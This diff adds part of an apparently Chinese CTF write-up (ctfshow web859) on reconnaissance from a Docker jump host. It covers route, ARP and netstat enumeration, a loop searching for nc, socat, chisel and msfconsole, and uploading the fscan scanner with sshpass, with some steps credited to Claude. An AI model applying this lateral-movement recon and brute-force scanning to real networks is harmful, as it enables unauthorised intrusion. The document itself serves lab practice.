+<li>坑：很多容器环境只有一张 eth0 网卡，没有其他网卡</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">172.2.152.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-n</code>：数字形式，<strong>不反向解析域名</strong>（非常重要！不加 - n 会 DNS 解析，卡住很慢）</li>
+<li>作用：查看路由表</li>
+<li>关键字段解读：<ul>
+<li><code>Destination</code>：目标网段</li>
+<li><code>Gateway</code>：网关</li>
+<li><code>Genmask</code>：子网掩码</li>
+<li><code>Flags</code>：U&#x3D;up，G &#x3D; 网关</li>
+</ul>
+</li>
+<li>两种典型情况：<ul>
+<li>有 <code>0.0.0.0</code> 行 &#x3D; 存在默认网关 → 机器可以向外访问（出网）</li>
+<li>没有 <code>0.0.0.0</code> &#x3D; 无默认路由，<strong>只能访问同网段，不能出外网</strong>（本题就是这个情况）</li>
+</ul>
+</li>
+<li>做题价值：判断你能不能直接把 shell 回连到外网 <code>vps</code>；没有默认网关就只能内网横向，不能直接反弹外网。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.2.152.4     shell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地静态域名解析文件，优先级高于 DNS</li>
+<li>里面是手动绑定的「域名 &lt;-&gt; IP」</li>
+<li>CTF 里可能在这里直接泄露其他内网主机名、隐藏 IP、比如 <code>samba</code>、<code>db</code> 主机</li>
+<li>一般容器跳板默认内容很少，但是必须扫一眼，属于低成本情报</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">nameserver 127.0.0.11</span><br><span class="line">options ndots:0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>系统 DNS 配置文件，记录 <code>nameserver</code>（DNS 服务器地址）</li>
+<li>本题是 <code>127.0.0.11</code>：Docker 内置 DNS，容器标准特征</li>
+<li>作用：<ol>
+<li>判断是不是 docker（<code>127.0.0.11</code> 是 <code>docker dns</code> 标志性地址）</li>
+<li>看能不能解析域名；如果 <code>nameserver</code> 是内网 DNS，有可能用域名探测内网资产</li>
+</ol>
+</li>
+<li>注意：不出网环境下，就算有 DNS，也解析不了外网域名</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/net/arp</span><br><span class="line">IP address       HW <span class="built_in">type</span>     Flags       HW address            Mask     Device</span><br><span class="line">172.2.152.139    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.2.152.46     0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.2.152.65     0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.2.152.228    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.2.152.127    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/proc</code> 内核虚拟文件，<code>arp</code> 缓存表</li>
+<li>ARP &#x3D; 二层地址解析：IP ↔ MAC</li>
+<li>作用：<strong>看同网段已经和它通信过的存活主机</strong></li>
+<li>优点：不需要主动发包扫描，直接读内核缓存，很隐蔽</li>
+<li>局限：只能看到已经交互过的机器；如果还没通信，里面是空的</li>
+</ul>
+<blockquote>
+<p>替代：有 <code>ip</code> 命令时用 <code>ip neigh</code>，本题没有 <code>ip</code>，所以用这个</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -tunlp</span><br><span class="line">(No info could be <span class="built_in">read</span> <span class="keyword">for</span> <span class="string">&quot;-p&quot;</span>: geteuid()=1000 but you should be root.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.11:44093        0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.11:53632        0.0.0.0:*                           -    </span><br></pre></td></tr></table></figure>
+
+<p>参数拆解：</p>
+<ul>
+<li><code>-t</code> TCP</li>
+<li><code>-u</code> UDP</li>
+<li><code>-n</code> 数字，不解析域名</li>
+<li><code>-l</code> 只看监听端口（listening）</li>
+<li><code>-p</code> 显示是哪个进程在监听（PID &#x2F; 程序名）<br>只看<strong>本机正在开放、等待别人连的端口</strong>，不是对外连接</li>
+<li>本题结果：22 端口 <code>sshd</code>、<code>docker dns 127.0.0.11:44093</code></li>
+<li>做题用途：<ol>
+<li>跳板本机有没有额外服务（<code>redis</code>、<code>mysql</code>、<code>web</code>）</li>
+<li>判断哪些端口对内网开放</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p>注意：低权限下 <code>-p</code> 有可能看不到进程名，只能 <code>root</code> 看到完整信息</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">env</span> | grep SSH</span><br><span class="line">SSH_CLIENT=172.2.152.2 46634 22</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">SSH_CONNECTION=172.2.152.2 46634 172.2.152.4 22</span><br></pre></td></tr></table></figure>
+
+<p>抓取 SSH 相关环境变量，重点看 <code>SSH_CONNECTION</code> <code>SSH_CONNECTION=客户端IP 客户端端口 跳板IP 跳板端口</code> 例子：<code>SSH_CONNECTION=172.2.152.2 54172 172.2.152.4 22</code> 含义：</p>
+<ul>
+<li>你是从 <code>172.2.152.2</code> 这个 NAT 网关连进跳板的</li>
+<li>跳板 IP 是 <code>172.2.152.4</code></li>
+<li>这个 IP 是网关，很多时候是内网拓扑关键节点，隧道、端口转发、socks 代理排错很有用</li>
+<li>区分：<code>SSH_CLIENT</code> 是简化版，<code>SSH_CONNECTION</code> 信息最全</li>
+</ul>
+<h2 id="串联"><a href="#串联" class="headerlink" title="串联"></a>串联</h2><p>那么有了基础的网络信息，我们怎么串联利用？</p>
+<ul>
+<li><code>ifconfig</code> → eth0：172.2.152.4&#x2F;24 → 目标网段：172.2.152.0&#x2F;24</li>
+<li><code>route -n</code> → 没有 0.0.0.0 默认路由 → <strong>跳板不能出外网，只能内网横向</strong></li>
+<li><code>/etc/resolv.conf</code> <code>nameserver=127.0.0.11</code> → Docker 容器跳板</li>
+<li><code>netstat -tunlp</code> → 只有 22ssh，没有其他本地服务 → 跳板本身没有漏洞，考点在横向</li>
+<li><code>SSH_CONNECTION</code> → 接入网关是 <code>172.2.152.2</code>，拓扑：攻击机 → <code>172.2.152.2</code> 网关 → 跳板 <code>172.2.152.4</code></li>
+</ul>
+<p>那么现在我们的一些方向：</p>
+<ul>
+<li>能不能直接反弹 shell 到外网 <code>vps</code>？→ 看 route 有没有默认网关</li>
+<li>扫描哪个网段？→ <code>ifconfig</code> 拿到的子网</li>
+<li>跳板上有没有本地服务漏洞？→ netstat 监听端口</li>
+<li>是不是 <code>docker</code>？→ <code>resolv.conf</code> + <code>/.dockerenv</code> 交叉验证</li>
+<li>同网段有没有已经存活机器？→ <code>/proc/net/arp</code></li>
+</ul>
+<hr>
+<h1 id="可用工具枚举与文件夹"><a href="#可用工具枚举与文件夹" class="headerlink" title="可用工具枚举与文件夹"></a>可用工具枚举与文件夹</h1><blockquote>
+<p>目的：<strong>快速摸清跳板自带哪些命令，决定你接下来是直接用自带工具打，还是需要上传二进制（<code>fscan/pspy/chisel</code> 等）</strong></p>
+</blockquote>
+<p>提示给了攻击机预置了某些工具，探测的话<code>Claude</code>给了一条长命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> nmap masscan nc socat curl wget python3 perl ruby gcc make git \</span><br><span class="line">         java gobuster ffuf sqlmap hydra msfconsole chisel frp proxychains; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">command</span> -v <span class="variable">$t</span> &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$t</span> -&gt; <span class="subst">$(command -v $t)</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[+] nc -&gt; /usr/bin/nc</span><br><span class="line">[+] curl -&gt; /usr/bin/curl</span><br><span class="line">[+] wget -&gt; /usr/bin/wget</span><br><span class="line">[+] python3 -&gt; /usr/bin/python3</span><br><span class="line">[+] perl -&gt; /usr/bin/perl</span><br><span class="line">[+] msfc: not foundusr/bin/msfconsole</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol>
+<li><code>for t in 工具列表</code><br>循环遍历我们关心的渗透工具清单：</li>
+</ol>
+<ul>
+<li>扫描类：<code>nmap</code>、<code>masscan</code></li>
+<li>隧道 &#x2F; 转发：<code>nc</code>、<code>socat</code>、<code>chisel</code>、<code>frp</code>、<code>proxychains</code></li>
+<li>下载：<code>curl</code>、<code>wget</code></li>
+<li>脚本解释器：<code>python3</code>、<code>perl</code>、<code>ruby</code>、<code>java</code>（用来写 <code>exp</code>、<code>shell</code>、转发）</li>
+<li>编译：<code>gcc</code>、<code>make</code>（本地编译 <code>exp</code>，不用传二进制）</li>
+<li>web 扫描：<code>gobuster</code>、<code>ffuf</code>、<code>sqlmap</code></li>
+<li>暴力破解：<code>hydra</code></li>
+<li>漏洞框架：<code>msfconsole</code></li>
+</ul>
+<ol start="2">
+<li><code>command -v $t</code><br><code>command -v</code>：<strong>查找该命令在 PATH 里的路径</strong><br>找到：返回程序路径<br>找不到：返回空，退出码非 0</li>
+</ol>
+<blockquote>
+<p>和 <code>which</code> 功能近似，但 <code>command -v</code> 是 shell 内置，更稳定，不受别名干扰，<code>webshell</code> &#x2F; 受限环境优先用它</p>
+</blockquote>
+<ol start="3">
+<li><code>&gt;/dev/null</code><br>把查找的标准输出丢掉，只靠退出码判断是否存在，不打印冗余内容</li>
+<li><code>&amp;&amp; echo &quot;[+] $t -&gt; $(command -v $t)&quot;</code><br>如果找到了这个工具，打印标记和完整路径。</li>
+</ol>
+<ul>
+<li><code>[+]</code> 方便肉眼快速定位存在的工具</li>
+<li>打印路径：有时候同一个命令有多个版本（比如 <code>python/python3</code>），确认是哪个</li>
+</ul>
+<blockquote>
+<p>输出示例：<code>[+] python3 -&gt; /usr/bin/python3</code><br>没有输出 &#x3D; 跳板上不存在这个工具</p>
+</blockquote>
+</blockquote>
+<h2 id="查看已经安装的软件包"><a href="#查看已经安装的软件包" class="headerlink" title="查看已经安装的软件包"></a>查看已经安装的软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep -Ei <span class="string">&#x27;netcat|socat|python|perl|metasploit|nmap|smb&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>dpkg -l</code>：<code>Debian/Ubuntu</code> 系查看已经安装的软件包（这题是 <code>Ubuntu</code> 容器）</li>
+<li><code>-Ei</code>：E 扩展正则，i 忽略大小写</li>
+<li>作用：补充上面的循环脚本<ul>
+<li>有些包安装了，但二进制不在 PATH、或者被改名；<code>command -v</code> 找不到，但是 <code>dpkg</code> 能查到包已经装了</li>
+<li>比如 <code>netcat</code> 有 <code>nc-openbsd</code>、<code>nc-traditional</code>；<code>samba</code> 相关套件、<code>msf</code> 等</li>
+</ul>
+</li>
+<li>局限：**<code>CentOS/RHEL</code> 没有 <code>dpkg</code>，要用 <code>rpm</code>**；本题是 <code>Ubuntu</code> 容器，适配</li>
+</ul>
+<blockquote>
+<p>注意：包装了 ≠ 命令一定能调用，还是以 <code>command -v</code> 为准</p>
+</blockquote>
+</blockquote>
+<h2 id="查看常见文件存放位置"><a href="#查看常见文件存放位置" class="headerlink" title="查看常见文件存放位置"></a>查看常见文件存放位置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /opt /usr/local/bin /tmp</span><br><span class="line">/opt:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 1 root root 4096 Feb 28  2023 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 21 14:53 ..</span><br><span class="line">drwxr-xr-x 5 root root 4096 Feb 28  2023 metasploit-framework</span><br><span class="line"></span><br><span class="line">/tmp:</span><br><span class="line">total 28</span><br><span class="line">drwxrwxrwt 1 root    root    4096 Nov 21 16:09 .</span><br><span class="line">drwxr-xr-x 1 root    root    4096 Nov 21 14:53 ..</span><br><span class="line">-rwxr-xr-x 1 root    root    6034 Feb 28  2023 msfinstall</span><br><span class="line">-rwxrwxr-x 1 root    root      55 Mar  1  2023 start.sh</span><br><span class="line">-rw-rw-r-- 1 ctfshow ctfshow  269 Nov 21 14:55 web859_exploit.rc</span><br><span class="line">-rw-rw-r-- 1 ctfshow ctfshow  336 Nov 21 14:54 web859_recon.rc</span><br><span class="line"></span><br><span class="line">/usr/local/bin:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  1  2021 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Apr  1  2021 ..</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这三个目录是渗透里<strong>自定义工具、上传文件、第三方程序高频存放位置</strong></p>
+<ul>
+<li><code>/usr/local/bin</code>：管理员手动编译安装的程序，会加到 PATH，直接执行</li>
+<li><code>/opt</code>：大型第三方软件（很多靶场会在这里放 msf、samba 工具）</li>
+<li><code>/tmp</code>：全局可写目录，我们上传工具、临时文件、反弹 shell 首选目录</li>
+</ul>
+</blockquote>
+<h2 id="本机实测结果："><a href="#本机实测结果：" class="headerlink" title="本机实测结果："></a>本机实测结果：</h2><p>自带：<code>nc</code>、<code>curl</code>、<code>wget</code>、<code>python3.8</code>、<code>perl</code>、<code>openssl</code>、<code>vim</code>、<code>msf6.3.5</code><br>缺失：<code>nmap</code>、<code>fscan</code>、<code>chisel</code>、<code>gcc</code></p>
+<h2 id="实测对应决策："><a href="#实测对应决策：" class="headerlink" title="实测对应决策："></a>实测对应决策：</h2><ul>
+<li>有 <code>python3</code> → 可以写简单扫描脚本、http 服务、反弹 shell、代理<ul>
+<li>但没有 <code>fscan</code>，<strong>必须上传 <code>fscan</code> 二进制</strong></li>
+</ul>
+</li>
+<li>有 <code>msfconsole</code> → 跳板本地可以直接 <code>msf</code>，不用攻击机的 <code>msf</code></li>
+<li>没有 <code>gcc</code> → 不能在跳板本地编译 <code>exp</code>，只能传静态编译好的 <code>exp</code></li>
+<li>有 <code>nc</code>、<code>socat</code> → 可以做简单端口转发、反弹 <code>shell</code></li>
+<li>没有 <code>chisel/frp</code> → 想要 <code>socks</code> 代理，要么上传 <code>chisel</code>，要么用 <code>python</code> 写简易代理</li>
+</ul>
+<hr>
+<h1 id="提权相关"><a href="#提权相关" class="headerlink" title="提权相关"></a>提权相关</h1><h2 id="三个不同的”提权”场景"><a href="#三个不同的”提权”场景" class="headerlink" title="三个不同的”提权”场景"></a>三个不同的”提权”场景</h2><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>谁需要提权</th>
+<th>典型缺口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>跳板机 &#x2F; 攻击机</td>
+<td>你手上的 SSH 账号</td>
+<td>要 raw socket、要绑 &lt;1024 端口、要读 &#x2F;root、要装工具、要抓包</td>
+</tr>
+<tr>
+<td>目标机 <code>foothold</code></td>
+<td>拿到的低权 <code>shell</code>（<code>www-data</code>、<code>nobody</code>）</td>
+<td>读不了 <code>flag</code> &#x2F; 配置 <code>/shadow</code>、写不了目录、装不了工具、连不上内网下一跳</td>
+</tr>
+<tr>
+<td>域环境</td>
+<td>域内普通用户</td>
+<td>横向到 <code>DC</code>、<code>DCSync</code>、<code>Kerberoast</code></td>
+</tr>
+</tbody></table>
+<h2 id="本机情况"><a href="#本机情况" class="headerlink" title="本机情况"></a>本机情况</h2><table>
+<thead>
+<tr>
+<th>若你要做</th>
+<th>是否需要 root</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TCP connect 扫描（MSF 默认、<code>nc</code>、<code>/dev/tcp</code>）</td>
+<td>❌ 不需要</td>
+</tr>
+<tr>
+<td>SYN 扫描 &#x2F;<code>masscan</code>&#x2F; 抓包（<code>tcpdump</code>）</td>
+<td>✅ 需要 raw socket</td>
+</tr>
+<tr>
+<td>端口转发到 &gt;1024（<code>ssh -L 8085:...</code>）</td>
+<td>❌ 不需要</td>
+</tr>
+<tr>
+<td>绑定 80&#x2F;443 做隧道或监听</td>
+<td>✅ 需要</td>
+</tr>
+<tr>
+<td>读 <code>/root</code>、<code>/etc/shadow</code></td>
+<td>✅ 需要</td>
+</tr>
+<tr>
+<td>apt install、改系统配置</td>
+<td>✅ 需要</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>实测 <code>sudo -n -l</code> 直接显示 <code>(ALL:ALL) NOPASSWD: ALL</code>，权限已经够了，无需任何提权动作，我用 <code>sudo</code> 跑了下 MSF。如果它是普通用户，上面表格里”需要”的那几行才会触发提权。</p>
+</blockquote>
+<h2 id="现状总结"><a href="#现状总结" class="headerlink" title="现状总结"></a>现状总结</h2><p>不总结了</p>
+<h2 id="接下来的步骤"><a href="#接下来的步骤" class="headerlink" title="接下来的步骤"></a>接下来的步骤</h2><p><code>Claude</code>给的步骤：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">基础环境探测（我是谁/在哪张网/有什么工具）</span><br><span class="line">        ↓</span><br><span class="line">① 内网资产发现    存活 → 端口 → 服务指纹</span><br><span class="line">        ↓</span><br><span class="line">② 攻击面入账 + 排序  按「利用价值 × 成本」排优先级</span><br><span class="line">        ↓</span><br><span class="line">③ 选入口做验证（ PoC / check）</span><br><span class="line">        ↓</span><br><span class="line">④ 拿第一个立足点（foothold）</span><br><span class="line">        ↓</span><br><span class="line">⑤ 立足点上二次信息收集（本地枚举）</span><br><span class="line">        ↓</span><br><span class="line">⑥ 提权 / 横向 / 凭据收集（按需，不是固定步骤）</span><br></pre></td></tr></table></figure>
+
+<p>所以现在我们需要扫一下内网信息。</p>
+<hr>
+<h1 id="内网扫描工具"><a href="#内网扫描工具" class="headerlink" title="内网扫描工具"></a>内网扫描工具</h1><p>由于这台攻击机上没有合适的如<code>nmap</code>、<code>fscan</code>等工具，但是<code>Claude</code>自己用了 “命令 + 脚本 + <code>msf</code>等工具扫描模块” 结合，代替工具完成了内网探测。</p>
+<p>但是我们这里没必要这么麻烦，因为上次<code>nmap</code>传过了，所以这里传一个<code>fscan</code>上去测</p>
+<p>这里可以通过<code>scp</code>上传，先说一下<code>Claude</code>是怎么判断出来的：</p>
+<p>判断流程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击机有 nmap/fscan 吗？ ──有──▶ 直接用（本关结束）</span><br><span class="line">        │没有</span><br><span class="line">        ▼</span><br><span class="line">能联网装吗？ ──能──▶ apt install（本关结束）</span><br><span class="line">        │不能</span><br><span class="line">        ▼</span><br><span class="line">能从我这传吗？ ──能──▶ scp 上传静态二进制</span><br><span class="line">        │不能</span><br><span class="line">        ▼</span><br><span class="line">用系统自带的东西替代（bash /dev/tcp、nc、MSF）</span><br></pre></td></tr></table></figure>
+
+<p>测试命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ① 有没有</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> nmap fscan masscan nc socat python3 msfconsole; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">command</span> -v <span class="variable">$t</span> &gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$t</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ② 能不能装（其实要测&quot;出不出网&quot;）</span></span><br><span class="line">ip route            <span class="comment"># 有没有 default 路由</span></span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">getent hosts mirrors.aliyun.com   <span class="comment"># 能不能解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ③ 能不能传 —— 从本机主动 scp 一个测试文件过去</span></span><br><span class="line">sshpass -p <span class="string">&#x27;ctfshow&#x27;</span> scp -P 28183 test.txt ctfshow@...:/tmp/</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>结果：</p>
+<ul>
+<li>① 只有 <code>nc</code> &#x2F; <code>curl</code> &#x2F; <code>wget</code> &#x2F; <code>python3</code> &#x2F; <code>perl</code> &#x2F; <code>msfconsole</code>，没有 <code>nmap</code>、没有 <code>fscan</code>；</li>
+<li>② 只有 <code>172.2.115.0/24</code> 直连路由、无 <code>default</code>，<code>DNS</code> 也解析失败 → 这条路死；</li>
+<li>③ <code>scp</code> 成功（我传了一个测试文件过去读回来，又删掉了）→ 这条路通。</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="Fscan工具介绍"><a href="#Fscan工具介绍" class="headerlink" title="Fscan工具介绍"></a>Fscan工具介绍</h1><p><code>fscan</code>（作者 <code>shadow1ng</code>）是<strong>Go 语言开发、面向内网的一键综合扫描工具</strong>，红队 &#x2F; 攻防演练内网横向最常用，和 Nmap 定位不一样：Nmap 侧重端口、主机探测；<code>fscan</code> 是<strong>把存活探测、端口、服务、弱口令爆破、漏洞 POC、Web 指纹打包全自动跑</strong>，开箱即用，体积很小、跨平台（Windows&#x2F;Linux）。</p>
+<blockquote>
+<p>开源地址：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">github.com&#x2F;shadow1ng&#x2F;fscan</a></p>
+</blockquote>
+<h2 id="核心能力（对比-Nmap）"><a href="#核心能力（对比-Nmap）" class="headerlink" title="核心能力（对比 Nmap）"></a>核心能力（对比 Nmap）</h2><ol>
+<li><strong>主机探测</strong>：ICMP 存活检测，支持 C 段 &#x2F; B 段批量扫描</li>
+<li><strong>端口扫描</strong>：TCP 全连接扫描，内置 133 个高频端口，自带服务识别</li>
+<li><strong>弱口令爆破</strong>：<code>SSH/RDP/SMB/FTP/MySQL/MSSQL/Redis</code> 等 28 种服务，内置弱口令字典，支持 <code>NTLM hash</code>、SSH 私钥认证<code>Gitee</code></li>
+<li><strong>高危漏洞检测</strong>：MS17-010 永恒之蓝、<code>SMBGhost</code>、<code>Redis</code> 未授权、<code>Mongo</code> 未授权；支持 <code>Xray</code> 格式 POC、<code>DNSLog</code> 外带检测</li>
+<li><strong>Web 探测</strong>：获取网站标题、中间件、CMS 指纹、WAF 识别，Web 漏洞扫描</li>
+<li><strong>漏洞利用模块</strong>：Redis 写公钥、写计划任务反弹 shell、SMB 命令执行等（实战内网横向）</li>
+<li>输出：自动保存 <code>result.txt</code>，支持 <code>json/csv</code> 输出、代理、线程控制、静默模式<code>GitCode</code></li>
+</ol>
+<h2 id="常用基础命令"><a href="#常用基础命令" class="headerlink" title="常用基础命令"></a>常用基础命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描C段，默认全开（存活+端口+爆破+poc）</span></span><br><span class="line">./fscan -h 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只扫端口，关闭爆破、关闭poc（减少流量、规避告警，类似纯nmap扫描）</span></span><br><span class="line">./fscan -h 192.168.1.0/24 -nobr -nopoc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口扫描</span></span><br><span class="line">./fscan -h 192.168.1.10 -p 22,80,3389,445</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单个URL Web扫描</span></span><br><span class="line">./fscan -u http://192.168.1.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件读取IP列表</span></span><br><span class="line">./fscan -f ip.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅存活探测</span></span><br><span class="line">./fscan -h 192.168.1.0/24 -ao</span><br></pre></td></tr></table></figure>
+
+<h2 id="fscan-vs-Nmap（重点）"><a href="#fscan-vs-Nmap（重点）" class="headerlink" title="fscan vs Nmap（重点）"></a>fscan vs Nmap（重点）</h2><ul>
+<li><code>Nmap</code>：通用端口扫描器，<strong>可控性强</strong>，扫描类型多（SYN 扫描等），适合信息收集；本身不带爆破、POC</li>
+<li><code>fscan</code>：<strong>内网自动化漏扫工具</strong>，内置大量漏洞 + 爆破逻辑，一键出结果；扫描是 TCP 全连接，容易被防火墙、EDR 告警</li>
+</ul>
+<h2 id="上传工具"><a href="#上传工具" class="headerlink" title="上传工具"></a>上传工具</h2><p>不仅小巧，功能也齐全，很合适上传。自己本地下载完工具后建议校验一下 sha256（<strong>安全习惯</strong>）。</p>
+<h3 id="交互式上传"><a href="#交互式上传" class="headerlink" title="交互式上传"></a>交互式上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 28248 fscan ctfshow@pwn.challenge.ctf.show:/tmp/fscan</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>手动输入密码，交互式，适合单次手动上传</p>
+</blockquote>
+<h3 id="非交互式上传"><a href="#非交互式上传" class="headerlink" title="非交互式上传"></a>非交互式上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p ctfshow scp -P 28248 fscan_2.2.2_linux_x64 ctfshow@pwn.challenge.ctf.show:/tmp/fscan</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>非交互，自动填密码，适合一键脚本、自动化，CTF 刷题常用</p>
+</blockquote>
+<ul>
+<li>运行环境：<strong>Kali 终端</strong>，不是跳板机 shell</li>
+<li>流向：Kali 本地的 <code>fscan</code> → 跳板机 <code>/tmp/fscan</code></li>
+<li><code>sshpass -p ctfshow</code>：自动提供密码<code>ctfshow</code>，避免 <code>scp</code> 弹出密码输入框，适合脚本一键跑</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /tmp/fscan</span><br></pre></td></tr></table></figure>
+
